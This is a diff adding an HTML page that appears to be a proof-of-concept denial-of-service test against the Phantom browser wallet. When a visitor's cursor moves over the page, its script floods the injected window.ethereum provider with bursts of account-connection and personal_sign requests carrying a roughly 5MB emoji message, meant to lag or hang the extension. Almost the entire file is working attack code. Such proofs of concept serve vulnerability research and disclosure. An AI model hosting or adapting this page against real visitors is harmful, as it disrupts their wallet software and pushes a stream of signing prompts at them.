@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>DoS Flood Test - Phantom Wallet</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body {
+      background: #111;
+      color: #eee;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      padding: 32px;
+      text-align: center;
+    }
+    .card {
+      background: #0f1720;
+      border-radius: 12px;
+      padding: 20px;
+      max-width: 600px;
+      margin: 0 auto;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.6);
+    }
+    h1 { margin: 0 0 16px 0; font-size: 24px; }
+    p { margin: 0 0 12px 0; color: #bfc9d9; }
+    pre {
+      margin-top: 12px;
+      background: #071021;
+      padding: 12px;
+      border-radius: 8px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      max-height: 300px;
+      overflow: auto;
+      color: #e6eef8;
+    }
+    .warn { color: #ffcc00; }
+  </style>
+</head>
+<body>
+  <div class="card" id="card">
+    <h1>DoS Flood Test - Phantom Wallet</h1>
+    <p>Move your cursor over the page to start flooding signing requests.</p>
+    <p class="warn">Warning: This floods API calls rapidly. May lag or hang the extension—test cautiously!</p>
+    <p>~5MB emoji message with 20+ requests/sec burst.</p>
+    <pre id="output">Ready. Move your cursor to flood the wallet provider.</pre>
+  </div>
+
+  <script>
+    // CONFIG
+    const TEST_MESSAGE_LENGTH = 5000000; // ~5MB to balance load without instant rejection
+    const FLOOD_INTERVAL_MS = 50; // 20 requests/sec
+    const FLOOD_BURST_COUNT = 20; // Initial burst size
+
+    const outEl = document.getElementById('output');
+    let floodInterval = null;
+    let requestCounter = 0;
+    let testMessage = null;
+
+    function log(...args) {
+      const line = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ');
+      outEl.textContent += line + "\n";
+      outEl.scrollTop = outEl.scrollHeight;
+      console.log(...args);
+    }
+
+    // Prepare emoji message
+    window.addEventListener('load', () => {
+      log(`Preparing ${TEST_MESSAGE_LENGTH} char emoji message...`);
+      const emojis = ['☠️', '😈', '💀', '🎃', '👻', '🧟‍♂️'];
+      testMessage = new Array(Math.floor(TEST_MESSAGE_LENGTH / 6))
+        .fill()
+        .map(() => emojis[Math.floor(Math.random() * emojis.length)])
+        .join('');
+      log('Message ready. Hover to start flooding.');
+    });
+
+    // Single flood request
+    async function floodRequest() {
+      requestCounter++;
+      if (!window.ethereum) {
+        log(`☠️ No ethereum provider at request #${requestCounter} — skipping.`);
+        return;
+      }
+
+      try {
+        // Chain eth_requestAccounts + personal_sign for max load
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const sig = await window.ethereum.request({
+          method: 'personal_sign',
+          params: [testMessage, '0x0000000000000000000000000000000000000000'] // Dummy address to avoid connect prompt
+        });
+        log(`✅ Flood #${requestCounter}: Signed (truncated: ${sig?.slice(0, 20)}...)`);
+      } catch (err) {
+        log(`❌ Flood #${requestCounter}: ${err.message || err} — continuing...`);
+      }
+    }
+
+    // Start flooding on mouseover
+    function startFlood() {
+      if (floodInterval || !testMessage) return;
+      log('Mouseover detected. Starting flood burst...');
+      requestCounter = 0;
+      floodInterval = setInterval(floodRequest, FLOOD_INTERVAL_MS);
+      // Burst initial requests
+      for (let i = 0; i < FLOOD_BURST_COUNT; i++) {
+        setTimeout(floodRequest, i * FLOOD_INTERVAL_MS);
+      }
+      // Sustain for 10s, then re-trigger on next hover
+      setTimeout(() => {
+        clearInterval(floodInterval);
+        floodInterval = null;
+        log('Flood cycle ended. Ready for next hover.');
+      }, 10000);
+    }
+
+    // Attach handler
+    document.body.addEventListener('mouseover', startFlood);
+  </script>
+</body>
+</html>
